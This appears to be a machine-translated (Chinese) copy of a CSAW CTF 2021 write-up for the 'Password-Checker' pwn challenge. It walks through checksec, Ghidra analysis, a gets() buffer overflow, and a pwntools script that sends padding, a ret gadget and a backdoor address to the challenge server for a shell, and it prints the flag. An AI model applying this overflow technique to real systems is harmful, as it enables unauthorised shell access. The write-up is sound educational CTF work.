<html>
<head>
<title>Password-Checker CSAW CTF 2021 Write-Up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">密码检查CSAW CTF 2021写</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/password-checker-csaw-ctf-2021-write-up-8949dd62c948?source=collection_archive---------4-----------------------#2021-09-29">https://infosecwriteups.com/password-checker-csaw-ctf-2021-write-up-8949dd62c948?source=collection_archive---------4-----------------------#2021-09-29</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/ccc7a188ead87e791e9430e5288fa099.png" data-original-src="https://miro.medium.com/v2/resize:fit:1250/format:webp/1*A3-3K-PtQ6Mxo9VjUoxBMQ.png"/></div></figure><p id="dd14" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这是二进制剥削的热身挑战。</p><p id="d0a8" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">可下载的文件是未剥离的64位二进制文件。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="la lb di lc bf ld"><div class="gh gi kv"><img src="../Images/ff11532f1c1628c220f40a72acbb4480.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1iXXzj1lUVROr7L09JeUmw.png"/></div></div></figure><p id="8729" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使用<strong class="jz iu"> checksec </strong>我们可以分析二进制文件。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div class="gh gi le"><img src="../Images/2227bf7eb4afe369a3c4e08affb54734.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/1*9TQqY-7UkxgNVWR1Wg-PwQ.png"/></div></figure><p id="65a4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使文件可写后，我们可以执行它。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div class="gh gi lf"><img src="../Images/c284239bc6495b1d7c7af62b9fe3bcca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1394/format:webp/1*5GWnRzKp-MQ3FIxZa7hgEg.png"/></div></figure><p id="2484" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们必须输入正确的密码才能进去。我第一次试着叫“查理”,但运气不好。</p><p id="aec9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">然后，我尝试了“密码”，它的工作，但没有任何标志的迹象。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div class="gh gi lg"><img src="../Images/c48b8e95677e0015c920777bfe0e8570.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*cxrkqf9SZyj2H7j5vjYJDg.png"/></div></figure><p id="0cfe" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">所以我们必须检查二进制文件是如何工作的。</p><p id="d977" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我用<strong class="jz iu"> Ghidra </strong>打开二进制文件并分析函数。</p><p id="27da" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在分析函数时，main函数调用一个名为password_checker的函数。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/ce2096604347b4e1628ace11bf58a3f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1034/format:webp/1*ZJcYV6cngTC-LhGXIhHeZQ.png"/></div></figure><p id="8287" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">正在进行字符串比较，这就是“密码”被接受的原因。但是这个程序有一个易受攻击的函数，就是gets()。</p><p id="1d91" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们打开gets()手册页时，它警告我们不要使用这个函数，因为gets()将存储超过缓冲区分配的字符，这将导致<strong class="jz iu">缓冲区溢出</strong>漏洞。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="la lb di lc bf ld"><div class="gh gi li"><img src="../Images/e527aeae13b2511314a91981e4c450cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rf4nbuOEa_z8QpcbVOedtg.png"/></div></div></figure><p id="8648" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">把它作为一个优势，我们可以打破二进制文件，以达到标志。</p><p id="8211" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我再次分析了这些函数，发现一个名为“后门”的函数很可疑。</p><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/4780f94cba666358e4a4f839e7cd4973.png" data-original-src="https://miro.medium.com/v2/resize:fit:538/format:webp/1*MBUfkudgZNdsR55VYjQY4Q.png"/></div></figure><figure class="kw kx ky kz gt ju gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/88d46c52421080d9f2ca9d9eacb4766e.png" data-original-src="https://miro.medium.com/v2/resize:fit:616/format:webp/1*BYF-5mMHoDQiAeeo17fNlg.png"/></div></figure><p id="55b9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">后门函数包含一个直接打开外壳的系统调用函数。这个外壳会带我们找到服务器。</p><p id="065b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我使用了<strong class="jz iu"> pwntools </strong>并创建了一个python代码来传递缓冲区并返回后门函数。</p><pre class="kw kx ky kz gt ll lm ln lo aw lp bi"><span id="1a6f" class="lq lr it lm b gy ls lt l lu lv">                   <br/>from pwn import *                                               <br/>elf = ELF("./password_checker")                       <br/>p = remote("pwn.chal.csaw.io",5000)                       <br/>rop = ROP(elf)                       <br/>ret = rop.find_gadget(["ret"]).address                       p.sendline(b"A"*72 + p64(ret) + p64(elf.sym["backdoor"]))                                               p.interactive()</span></pre><p id="8fe1" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">通过运行这段python代码，我获得了挑战的旗帜！</p><p id="d42c" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><strong class="jz iu">flag { CH4 R1 i3 _ 4 PPR 3c i4 t 35 _ y0u _ f0r _ y0ur _ h31p }</strong></p></div></div>    
</body>
</html>